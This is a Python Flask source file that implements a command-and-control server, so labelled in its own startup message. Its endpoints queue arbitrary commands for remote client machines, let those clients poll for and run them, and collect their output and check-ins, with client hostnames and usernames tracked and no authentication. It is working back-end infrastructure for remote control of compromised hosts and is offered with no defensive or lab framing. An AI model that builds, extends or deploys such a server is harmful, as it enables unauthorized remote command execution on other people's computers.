# In your server.py file, update these endpoints:

from flask import Flask, request, jsonify
import time
import uuid

app = Flask(__name__)

# Store commands in memory (use database in production)
pending_commands = {}
command_results = {}

@app.route('/api/command', methods=['POST'])
def send_command():
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'No JSON data provided'}), 400
        
        client_id = data.get('client_id')
        command = data.get('command')
        
        if not client_id or not command:
            return jsonify({'error': 'Missing client_id or command'}), 400
        
        # Generate unique command ID
        command_id = str(uuid.uuid4())
        
        # Store command
        pending_commands[command_id] = {
            'client_id': client_id,
            'command': command,
            'status': 'pending',
            'created_at': time.time(),
            'updated_at': time.time()
        }
        
        # Initialize result storage
        command_results[command_id] = {
            'output': '',
            'status': 'pending'
        }
        
        print(f"[SERVER] Command received: {command_id} for {client_id}: {command}")
        
        return jsonify({
            'success': True,
            'command_id': command_id,
            'message': 'Command queued'
        }), 200
        
    except Exception as e:
        print(f"[SERVER ERROR] /api/command: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/result', methods=['POST'])
def submit_result():
    """Client submits command result"""
    try:
        data = request.json
        command_id = data.get('command_id')
        output = data.get('output', '')
        
        if not command_id:
            return jsonify({'error': 'Missing command_id'}), 400
        
        if command_id in command_results:
            command_results[command_id] = {
                'output': output,
                'status': 'completed',
                'completed_at': time.time()
            }
            
            if command_id in pending_commands:
                pending_commands[command_id]['status'] = 'completed'
                pending_commands[command_id]['updated_at'] = time.time()
            
            print(f"[SERVER] Result received for {command_id}: {len(output)} chars")
            
            return jsonify({'success': True}), 200
        else:
            return jsonify({'error': 'Command not found'}), 404
            
    except Exception as e:
        print(f"[SERVER ERROR] /api/command/result: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/result/<command_id>', methods=['GET'])
def get_result(command_id):
    """Console fetches command result"""
    if command_id in command_results:
        result = command_results[command_id]
        return jsonify({
            'success': True,
            'status': result.get('status', 'pending'),
            'output': result.get('output', ''),
            'command_id': command_id
        }), 200
    else:
        return jsonify({
            'success': False,
            'error': 'Command not found',
            'status': 'unknown'
        }), 404

@app.route('/api/commands/<client_id>', methods=['GET'])
def get_commands(client_id):
    """Client fetches pending commands"""
    try:
        commands = []
        for cmd_id, cmd_data in pending_commands.items():
            if cmd_data['client_id'] == client_id and cmd_data['status'] == 'pending':
                commands.append({
                    'id': cmd_id,
                    'command': cmd_data['command']
                })
                # Mark as sent (optional)
                pending_commands[cmd_id]['status'] = 'sent'
                pending_commands[cmd_id]['sent_at'] = time.time()
        
        return jsonify({'commands': commands}), 200
    except Exception as e:
        print(f"[SERVER ERROR] /api/commands: {e}")
        return jsonify({'commands': []}), 500

@app.route('/api/clients', methods=['GET'])
def get_clients():
    """Get list of connected clients"""
    # You should implement proper client tracking
    clients = [
        {
            'id': 'test_client_123',
            'hostname': 'localhost',
            'username': 'user',
            'os': 'Windows',
            'status': 'online',
            'last_seen': time.time()
        }
    ]
    return jsonify({'clients': clients}), 200

@app.route('/api/stats', methods=['GET'])
def get_stats():
    return jsonify({
        'online_clients': 1,
        'total_commands': len(pending_commands),
        'pending_commands': len([c for c in pending_commands.values() if c['status'] == 'pending']),
        'server_time': time.time()
    }), 200

@app.route('/api/checkin', methods=['POST'])
def checkin():
    """Client checkin endpoint"""
    try:
        data = request.json
        print(f"[SERVER] Checkin from: {data}")
        return jsonify({'status': 'ok'}), 200
    except:
        return jsonify({'status': 'ok'}), 200

if __name__ == '__main__':
    print("[SERVER] Starting C2 server on http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000, debug=True)
